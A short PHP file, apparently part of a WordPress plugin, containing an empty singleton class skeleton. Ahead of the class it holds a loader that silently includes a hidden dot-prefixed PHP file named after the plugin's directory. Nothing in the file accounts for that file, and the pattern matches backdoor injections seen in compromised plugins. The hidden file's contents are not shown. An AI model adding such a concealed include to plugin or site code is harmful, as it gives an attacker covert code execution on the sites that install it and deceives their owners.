<?php

if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class SingletonClass
{
    public static function getInstance()
    {
    }

    public function doSomething()
    {
    }

    protected function __construct()
    {
    }

    final private function __sleep()
    {
    }

    final private function __wakeup()
    {
    }

    final private function __clone()
    {
    }
}
